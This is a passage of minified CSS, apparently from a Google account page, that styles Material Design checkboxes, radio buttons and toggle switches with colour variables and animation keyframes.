.VfPpkd-l6JLsf::before{background:rgb(60,64,67)}.LXctle .VfPpkd-l6JLsf{border-radius:7px 7px 7px 7px}@media (-ms-high-contrast:active),screen and (forced-colors:active){.LXctle:disabled .VfPpkd-uMhiad::after{opacity:1}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled .VfPpkd-pafCAf{fill:ButtonText}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:disabled .VfPpkd-pafCAf{fill:GrayText}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:enabled .VfPpkd-pafCAf{fill:ButtonText}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:disabled .VfPpkd-pafCAf{fill:GrayText}.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:disabled .VfPpkd-lw9akd{opacity:1}.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd:disabled .VfPpkd-lw9akd{opacity:1}.LXctle:disabled .VfPpkd-l6JLsf{opacity:1}}.uVccjd{box-flex:0;flex-grow:0;-moz-user-select:none;-moz-transition:border-color .2s cubic-bezier(0.4,0,0.2,1);transition:border-color .2s cubic-bezier(0.4,0,0.2,1);border:10px solid rgba(0,0,0,.54);-moz-border-radius:3px;border-radius:3px;-moz-box-sizing:content-box;box-sizing:content-box;cursor:pointer;display:inline-block;max-height:0;max-width:0;outline:none;overflow:visible;position:relative;vertical-align:middle;z-index:0}.uVccjd.ZdhN5b{border-color:rgba(255,255,255,.7)}.uVccjd.ZdhN5b[aria-disabled=true]{border-color:rgba(255,255,255,.3)}.uVccjd[aria-disabled=true]{border-color:#bdbdbd;cursor:default}.uHMk6b{-moz-transition:all .1s .15s cubic-bezier(0.4,0,0.2,1);transition:all .1s .15s cubic-bezier(0.4,0,0.2,1);-moz-transition-property:transform,border-radius;transition-property:transform,border-radius;border:8px solid white;left:-8px;position:absolute;top:-8px}[aria-checked=true]>.uHMk6b,[aria-checked=mixed]>.uHMk6b{-moz-transform:scale(0);transform:scale(0);transition:-webkit-transform .1s cubic-bezier(0.4,0,0.2,1);transition:transform .1s cubic-bezier(0.4,0,0.2,1);transition:transform .1s cubic-bezier(0.4,0,0.2,1),-webkit-transform .1s cubic-bezier(0.4,0,0.2,1);-moz-border-radius:100%;border-radius:100%}.B6Vhqe .TCA6qd{left:5px;top:2px}.N2RpBe .TCA6qd{left:10px;-moz-transform:rotate(-45deg);transform:rotate(-45deg);-moz-transform-origin:0;transform-origin:0;top:7px}.TCA6qd{height:100%;pointer-events:none;position:absolute;width:100%}.rq8Mwb{-moz-animation:quantumWizPaperAnimateCheckMarkOut .2s forwards;animation:quantumWizPaperAnimateCheckMarkOut .2s forwards;clip:rect(0,20px,20px,0);height:20px;left:-10px;position:absolute;top:-10px;width:20px}[aria-checked=true]>.rq8Mwb,[aria-checked=mixed]>.rq8Mwb{-moz-animation:quantumWizPaperAnimateCheckMarkIn .2s .1s forwards;animation:quantumWizPaperAnimateCheckMarkIn .2s .1s forwards;clip:rect(0,20px,20px,20px)}@media print{[aria-checked=true]>.rq8Mwb,[aria-checked=mixed]>.rq8Mwb{clip:auto}}.B6Vhqe .MbUTNc{display:none}.MbUTNc{border:1px solid #fff;height:5px;left:0;position:absolute}.B6Vhqe .Ii6cVc{width:8px;top:7px}.N2RpBe .Ii6cVc{width:11px}.Ii6cVc{border:1px solid #fff;left:0;position:absolute;top:5px}.PkgjBf{-moz-transform:scale(2.5);transform:scale(2.5);-moz-transition:opacity 0.15s ease;transition:opacity 0.15s ease;background-color:rgba(0,0,0,0.2);-moz-border-radius:100%;border-radius:100%;height:20px;left:-10px;opacity:0;outline:.1px solid transparent;pointer-events:none;position:absolute;top:-10px;width:20px;z-index:-1}.ZdhN5b .PkgjBf{background-color:rgba(255,255,255,0.2)}.qs41qe>.PkgjBf{-moz-animation:quantumWizRadialInkSpread .3s;animation:quantumWizRadialInkSpread .3s;animation-fill-mode:forwards;opacity:1}.i9xfbb>.PkgjBf{background-color:rgba(0,150,136,0.2)}.u3bW4e>.PkgjBf{-moz-animation:quantumWizRadialInkFocusPulse .7s infinite alternate;animation:quantumWizRadialInkFocusPulse .7s infinite alternate;background-color:rgba(0,150,136,0.2);opacity:1}@keyframes quantumWizPaperAnimateCheckMarkIn{0%{clip:rect(0,0,20px,0)}to{clip:rect(0,20px,20px,0)}}@keyframes quantumWizPaperAnimateCheckMarkOut{0%{clip:rect(0,20px,20px,0)}to{clip:rect(0,20px,20px,20px)}}@keyframes quantumWizRadioInkSpreadOverride{0%{transform:scale(1.5);opacity:0}100%{transform:scale(2.5);opacity:0.1}}@keyframes quantumWizRadioInkFocusPulseOverride{0%{transform:scale(2);opacity:0}100%{transform:scale(2.5);opacity:0.1}}.v5IR3e .sfqPrd{border-bottom:1px solid #c4c7c5;border-bottom:1px solid var(--gm3-sys-color-outline-variant,#c4c7c5)}.QTJzre{display:-moz-inline-box;display:inline-flex;min-height:24px;padding:16px 0;width:100%}.ZlURZc{margin-left:40px}.ZlURZc .sfqPrd{border-bottom:none}.ZlURZc .QTJzre{padding:8px 0}.ZlURZc .sfqPrd:last-child .QTJzre{padding-bottom:16px}.QTJzre.PlAvif{padding:0}.QTJzre.cd29Sd{display:-moz-box;display:flex}.QTJzre.RDPZE{pointer-events:none}.uxXgMe{-moz-box-align:center;align-items:center;display:-moz-box;display:flex;-moz-box-flex:0;flex:none;height:24px;-moz-box-pack:center;justify-content:center;position:relative}.QTJzre:not(.Msforc) .uxXgMe{width:24px}.QTJzre.Msforc .uxXgMe{width:52px}.uxXgMe .VfPpkd-dgl2Hf-ppHlrf-sM5MNb{position:absolute;top:-12px}.QTJzre.NEk0Ve .uxXgMe{--mdc-checkbox-checked-color:var(--gm3-sys-color-primary,#0b57d0);--mdc-checkbox-selected-icon-color:var(--gm3-sys-color-primary,#0b57d0);--mdc-checkbox-selected-pressed-icon-color:var(--gm3-sys-color-primary,#0b57d0);--mdc-checkbox-selected-state-layer-color:var(--gm3-sys-color-primary,#0b57d0)}.QTJzre.NEk0Ve .uxXgMe .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd{border-color:var(--gm3-sys-color-on-surface-variant,#444746);border-color:var(--mdc-checkbox-unselected-icon-color,var(--gm3-sys-color-on-surface-variant,#444746));background-color:transparent}.QTJzre.NEk0Ve .uxXgMe .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd{border-color:var(--gm3-sys-color-primary,#0b57d0);border-color:var(--mdc-checkbox-selected-icon-color,var(--gm3-sys-color-primary,#0b57d0));background-color:var(--gm3-sys-color-primary,#0b57d0);background-color:var(--mdc-checkbox-selected-icon-color,var(--gm3-sys-color-primary,#0b57d0))}@keyframes mdc-checkbox-fade-in-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface-variant--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary{0%{border-color:var(--gm3-sys-color-on-surface-variant,#444746);border-color:var(--mdc-checkbox-unselected-icon-color,var(--gm3-sys-color-on-surface-variant,#444746));background-color:transparent}50%{border-color:var(--gm3-sys-color-primary,#0b57d0);border-color:var(--mdc-checkbox-selected-icon-color,var(--gm3-sys-color-primary,#0b57d0));background-color:var(--gm3-sys-color-primary,#0b57d0);background-color:var(--mdc-checkbox-selected-icon-color,var(--gm3-sys-color-primary,#0b57d0))}}@keyframes mdc-checkbox-fade-out-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface-variant--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary{0%,80%{border-color:var(--gm3-sys-color-primary,#0b57d0);border-color:var(--mdc-checkbox-selected-icon-color,var(--gm3-sys-color-primary,#0b57d0));background-color:var(--gm3-sys-color-primary,#0b57d0);background-color:var(--mdc-checkbox-selected-icon-color,var(--gm3-sys-color-primary,#0b57d0))}100%{border-color:var(--gm3-sys-color-on-surface-variant,#444746);border-color:var(--mdc-checkbox-unselected-icon-color,var(--gm3-sys-color-on-surface-variant,#444746));background-color:transparent}}.QTJzre.NEk0Ve .uxXgMe.VfPpkd-MPu53c-OWXEXe-vwu2ne-iAfbIe-barxie .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe.VfPpkd-MPu53c-OWXEXe-vwu2ne-iAfbIe-A9y3zc .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd{animation-name:mdc-checkbox-fade-in-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface-variant--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary}.QTJzre.NEk0Ve .uxXgMe.VfPpkd-MPu53c-OWXEXe-vwu2ne-barxie-iAfbIe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe.VfPpkd-MPu53c-OWXEXe-vwu2ne-A9y3zc-iAfbIe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd{animation-name:mdc-checkbox-fade-out-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface-variant--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary}.QTJzre.NEk0Ve .uxXgMe:hover .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd{border-color:var(--gm3-sys-color-on-surface,#1f1f1f);border-color:var(--mdc-checkbox-unselected-hover-icon-color,var(--gm3-sys-color-on-surface,#1f1f1f));background-color:transparent}.QTJzre.NEk0Ve .uxXgMe:hover .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:hover .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:hover .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd{border-color:var(--gm3-sys-color-primary,#0b57d0);border-color:var(--mdc-checkbox-selected-hover-icon-color,var(--gm3-sys-color-primary,#0b57d0));background-color:var(--gm3-sys-color-primary,#0b57d0);background-color:var(--mdc-checkbox-selected-hover-icon-color,var(--gm3-sys-color-primary,#0b57d0))}.QTJzre.NEk0Ve .uxXgMe:hover.VfPpkd-MPu53c-OWXEXe-vwu2ne-iAfbIe-barxie .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:hover.VfPpkd-MPu53c-OWXEXe-vwu2ne-iAfbIe-A9y3zc .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd{animation-name:mdc-checkbox-fade-in-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary}.QTJzre.NEk0Ve .uxXgMe:hover.VfPpkd-MPu53c-OWXEXe-vwu2ne-barxie-iAfbIe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:hover.VfPpkd-MPu53c-OWXEXe-vwu2ne-A9y3zc-iAfbIe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd{animation-name:mdc-checkbox-fade-out-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary}.QTJzre.NEk0Ve .uxXgMe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd{border-color:var(--gm3-sys-color-on-surface,#1f1f1f);border-color:var(--mdc-checkbox-unselected-focus-icon-color,var(--gm3-sys-color-on-surface,#1f1f1f));background-color:transparent}.QTJzre.NEk0Ve .uxXgMe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(.VfPpkd-ksKsZd-mWPk3d):focus .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd{border-color:var(--gm3-sys-color-primary,#0b57d0);border-color:var(--mdc-checkbox-selected-focus-icon-color,var(--gm3-sys-color-primary,#0b57d0));background-color:var(--gm3-sys-color-primary,#0b57d0);background-color:var(--mdc-checkbox-selected-focus-icon-color,var(--gm3-sys-color-primary,#0b57d0))}.QTJzre.NEk0Ve .uxXgMe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe.VfPpkd-MPu53c-OWXEXe-vwu2ne-iAfbIe-barxie .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe.VfPpkd-MPu53c-OWXEXe-vwu2ne-iAfbIe-A9y3zc .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(.VfPpkd-ksKsZd-mWPk3d):focus.VfPpkd-MPu53c-OWXEXe-vwu2ne-iAfbIe-barxie .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(.VfPpkd-ksKsZd-mWPk3d):focus.VfPpkd-MPu53c-OWXEXe-vwu2ne-iAfbIe-A9y3zc .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd{animation-name:mdc-checkbox-fade-in-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary}.QTJzre.NEk0Ve .uxXgMe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe.VfPpkd-MPu53c-OWXEXe-vwu2ne-barxie-iAfbIe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe.VfPpkd-MPu53c-OWXEXe-vwu2ne-A9y3zc-iAfbIe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(.VfPpkd-ksKsZd-mWPk3d):focus.VfPpkd-MPu53c-OWXEXe-vwu2ne-barxie-iAfbIe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(.VfPpkd-ksKsZd-mWPk3d):focus.VfPpkd-MPu53c-OWXEXe-vwu2ne-A9y3zc-iAfbIe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd{animation-name:mdc-checkbox-fade-out-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary}.QTJzre.NEk0Ve .uxXgMe:not(:disabled):active .VfPpkd-muHVFf-bMcfAe:enabled:not(:checked):not(:indeterminate):not([data-indeterminate=true])~.VfPpkd-YQoJzd{border-color:var(--gm3-sys-color-on-surface,#1f1f1f);border-color:var(--mdc-checkbox-unselected-pressed-icon-color,var(--gm3-sys-color-on-surface,#1f1f1f));background-color:transparent}.QTJzre.NEk0Ve .uxXgMe:not(:disabled):active .VfPpkd-muHVFf-bMcfAe:enabled:checked~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(:disabled):active .VfPpkd-muHVFf-bMcfAe:enabled:indeterminate~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(:disabled):active .VfPpkd-muHVFf-bMcfAe[data-indeterminate=true]:enabled~.VfPpkd-YQoJzd{border-color:var(--gm3-sys-color-primary,#0b57d0);border-color:var(--mdc-checkbox-selected-pressed-icon-color,var(--gm3-sys-color-primary,#0b57d0));background-color:var(--gm3-sys-color-primary,#0b57d0);background-color:var(--mdc-checkbox-selected-pressed-icon-color,var(--gm3-sys-color-primary,#0b57d0))}@keyframes mdc-checkbox-fade-in-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary{0%{border-color:var(--gm3-sys-color-on-surface,#1f1f1f);border-color:var(--mdc-checkbox-unselected-pressed-icon-color,var(--gm3-sys-color-on-surface,#1f1f1f));background-color:transparent}50%{border-color:var(--gm3-sys-color-primary,#0b57d0);border-color:var(--mdc-checkbox-selected-pressed-icon-color,var(--gm3-sys-color-primary,#0b57d0));background-color:var(--gm3-sys-color-primary,#0b57d0);background-color:var(--mdc-checkbox-selected-pressed-icon-color,var(--gm3-sys-color-primary,#0b57d0))}}@keyframes mdc-checkbox-fade-out-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary{0%,80%{border-color:var(--gm3-sys-color-primary,#0b57d0);border-color:var(--mdc-checkbox-selected-pressed-icon-color,var(--gm3-sys-color-primary,#0b57d0));background-color:var(--gm3-sys-color-primary,#0b57d0);background-color:var(--mdc-checkbox-selected-pressed-icon-color,var(--gm3-sys-color-primary,#0b57d0))}100%{border-color:var(--gm3-sys-color-on-surface,#1f1f1f);border-color:var(--mdc-checkbox-unselected-pressed-icon-color,var(--gm3-sys-color-on-surface,#1f1f1f));background-color:transparent}}.QTJzre.NEk0Ve .uxXgMe:not(:disabled):active.VfPpkd-MPu53c-OWXEXe-vwu2ne-iAfbIe-barxie .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(:disabled):active.VfPpkd-MPu53c-OWXEXe-vwu2ne-iAfbIe-A9y3zc .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd{animation-name:mdc-checkbox-fade-in-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary}.QTJzre.NEk0Ve .uxXgMe:not(:disabled):active.VfPpkd-MPu53c-OWXEXe-vwu2ne-barxie-iAfbIe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd,.QTJzre.NEk0Ve .uxXgMe:not(:disabled):active.VfPpkd-MPu53c-OWXEXe-vwu2ne-A9y3zc-iAfbIe .VfPpkd-muHVFf-bMcfAe:enabled~.VfPpkd-YQoJzd{animation-name:mdc-checkbox-fade-out-background---boq-accounts-wireframe-themes-materialnext-common-css-color-on-surface--boq-accounts-wireframe-themes-materialnext-common-css-color-primary00000000--boq-accounts-wireframe-themes-materialnext-common-css-color-primary}.QTJzre.NEk0Ve .uxXgMe .VfPpkd-OYHm6b::before,.QTJzre.NEk0Ve .uxXgMe .VfPpkd-OYHm6b::after{background-color:var(--gm3-sys-color-on-surface,#1f1f1f);background-color:var(--mdc-checkbox-unselected-hover-state-layer-color,var(--gm3-sys-color-on-surface,#1f1f1f))}.QTJzre.NEk0Ve .uxXgMe .VfPpkd-OYHm6b::before{background-color:var(--gm3-sys-color-on-surface,#1f1f1f);background-color:var(--mdc-checkbox-unselected-hover-state-layer-color,var(--gm3-sys-color-on-surface,#1f1f1f))}.QTJzre.NEk0Ve .uxXgMe .VfPpkd-OYHm6b::after{background-color:var(--gm3-sys-color-on-surface,#1f1f1f);background-color:var(--mdc-checkbox-unselected-pressed-state-layer-color,var(--gm3-sys-color-on-surface,#1f1f1f))}.QTJzre.NEk0Ve .uxXgMe.VfPpkd-MPu53c-OWXEXe-gk6SMd .VfPpkd-OYHm6b::before,.QTJzre.NEk0Ve .uxXgMe.VfPpkd-MPu53c-OWXEXe-gk6SMd .VfPpkd-OYHm6b::after{background-color:var(--gm3-sys-color-primary,#0b57d0);background-color:var(--mdc-checkbox-selected-hover-state-layer-color,var(--gm3-sys-color-primary,#0b57d0))}.QTJzre.NEk0Ve .uxXgMe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe.VfPpkd-MPu53c-OWXEXe-gk6SMd .VfPpkd-OYHm6b::before,.QTJzre.NEk0Ve .uxXgMe.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe.VfPpkd-MPu53c-OWXEXe-gk6SMd .VfPpkd-OYHm6b::after{background-color:var(--gm3-sys-color-primary,#0b57d0);background-color:var(--mdc-checkbox-selected-hover-state-layer-color,var(--gm3-sys-color-primary,#0b57d0))}.QTJzre.QTJzre.NEk0Ve .uxXgMe .VfPpkd-OYHm6b::before,.QTJzre.QTJzre.NEk0Ve .uxXgMe .VfPpkd-OYHm6b::after{background-color:#0b57d0;background-color:var(--gm3-sys-color-primary,#0b57d0)}.QTJzre.N3snbf .uxXgMe{margin-left:16px}.QTJzre.STFd6 .uxXgMe{-moz-box-align:start;align-items:flex-start}.QTJzre.PlAvif .uxXgMe{margin-top:16px}.QTJzre.zVkt0c.STFd6 .uxXgMe{position:relative;top:10px;-moz-box-align:center;align-items:center}.QTJzre.NEk0Ve.STFd6 .uxXgMe{position:relative;top:10px}.ZlURZc .QTJzre.NEk0Ve.STFd6 .uxXgMe{position:relative;top:8px}.g9Mx .QTJzre.STFd6 .uxXgMe{position:relative;top:6px}.lezCeb.lezCeb{-moz-box-sizing:content-box;box-sizing:content-box;display:block}.lezCeb .fsHoPb,.lezCeb .oyD5Oc{border-color:white;border-color:var(--gm3-sys-color-background,white)}.lezCeb,.QTJzre,.lezCeb .Id5V1{border-color:#747775;border-color:var(--gm3-sys-color-outline,#747775)}.kAVONc.N2RpBe,.kAVONc.N2RpBe .Id5V1,.kAVONc .nQOrEb{border-color:#0b57d0;border-color:var(--gm3-sys-color-primary,#0b57d0)}.lezCeb.u3bW4e>.MbhUzd{animation:quantumWizRadioInkFocusPulseOverride .7s infinite alternate}.lezCeb.qs41qe>.MbhUzd{animation:quantumWizRadioInkSpreadOverride .3s;animation-fill-mode:forwards}.lezCeb.i9xfbb>.MbhUzd,.lezCeb.u3bW4e>.MbhUzd{background-color:#0b57d0;background-color:var(--gm3-sys-color-primary,#0b57d0)}.myYH1.Jj6Lae .kAVONc,.myYH1.Jj6Lae .kAVONc .Id5V1,.myYH1.Jj6Lae .kAVONc .nQOrEb{border-color:#b3261e;border-color:var(--gm3-sys-color-error,#b3261e)}.lezCeb.RDPZE .Id5V1,.QTJzre.RDPZE .nQOrEb{border-color:#1f1f1f;border-color:var(--gm3-sys-color-on-surface,#1f1f1f);opacity:0.38}.lezCeb.LXctle{width:52px}.lezCeb.LXctle .VfPpkd-l6JLsf{border-radius:32px;height:32px}.lezCeb.LXctle:enabled:active .VfPpkd-l6JLsf::before,.lezCeb.LXctle:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(:active) .VfPpkd-l6JLsf::before,.lezCeb.LXctle:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe):not(:active) .VfPpkd-l6JLsf::before,.lezCeb.LXctle:enabled .VfPpkd-l6JLsf::before{background-color:#e1e3e1;background-color:var(--gm3-sys-color-surface-variant,#e1e3e1);border:2px solid;border-color:#747775;border-color:var(--gm3-sys-color-outline,#747775)}.lezCeb.LXctle:enabled:active .VfPpkd-l6JLsf::after,.lezCeb.LXctle:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(:active) .VfPpkd-l6JLsf::after,.lezCeb.LXctle:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe):not(:active) .VfPpkd-l6JLsf::after,.lezCeb.LXctle:enabled .VfPpkd-l6JLsf::after{background-color:#0b57d0;background-color:var(--gm3-sys-color-primary,#0b57d0)}.lezCeb.LXctle .VfPpkd-uMhiad-u014N{width:calc(100% - 24px)}.lezCeb.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-uMhiad-u014N{transform:translateX(calc(100% - 8px))}.lezCeb.LXctle:disabled .VfPpkd-l6JLsf::before{background-color:#e1e3e1;background-color:var(--gm3-sys-color-surface-variant,#e1e3e1);border:2px solid var(--gm3-sys-color-on-surface,#1f1f1f)}.lezCeb.LXctle:disabled .VfPpkd-l6JLsf::after{background-color:var(--gm3-sys-color-on-surface,#1f1f1f)}.lezCeb.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-uMhiad{border-radius:24px;height:24px;left:4px;width:24px}.lezCeb.LXctle.VfPpkd-scr2fc-OWXEXe-uqeOfd .VfPpkd-uMhiad{border-radius:16px;height:16px;left:8px;width:16px}.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-uqeOfd .VfPpkd-uMhiad::before,.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-uqeOfd .VfPpkd-uMhiad::after{background-color:#747775;background-color:var(--gm3-sys-color-outline,#747775)}.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-uMhiad::before,.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-uMhiad::after{background-color:#fff;background-color:var(--gm3-sys-color-on-primary,#fff)}.lezCeb.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .VfPpkd-Qsb3yd::before,.lezCeb.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe .FPG9vb-qxrJBc::after,.lezCeb.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:active .VfPpkd-Qsb3yd::before,.lezCeb.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:active .VfPpkd-Qsb3yd::after,.lezCeb.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe) .VfPpkd-Qsb3yd::before,.lezCeb.LXctle.VfPpkd-scr2fc-OWXEXe-gk6SMd:enabled:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe) .VfPpkd-Qsb3yd::after{background-color:#0b57d0;background-color:var(--gm3-sys-color-primary,#0b57d0)}.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-gk6SMd:active .VfPpkd-uMhiad::after,.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-gk6SMd.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe:not(:active) .VfPpkd-uMhiad::after,.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-gk6SMd:hover:not(.VfPpkd-ksKsZd-mWPk3d-OWXEXe-AHe6Kc-XpnDCe):not(:active) .VfPpkd-uMhiad::after{background-color:#d3e3fd;background-color:var(--gm3-sys-color-primary-container,#d3e3fd)}.lezCeb.LXctle:disabled.VfPpkd-scr2fc-OWXEXe-gk6SMd .VfPpkd-uMhiad::after{background-color:--boq-accounts-wireframe-themes-materialnext-selectioninput-toggle-gmswitch-handle-color-checked-disabled-fallback;background-color:--boq-accounts-wireframe-themes-materialnext-selectioninput-toggle-gmswitch-handle-color-checked-disabled}.lezCeb.LXctle:disabled.VfPpkd-scr2fc-OWXEXe-uqeOfd .VfPpkd-uMhiad::after{background-color:var(--gm3-sys-color-on-surface,#1f1f1f)}.lezCeb.LXctle:enabled.VfPpkd-scr2fc-OWXEXe-uqeOfd:active 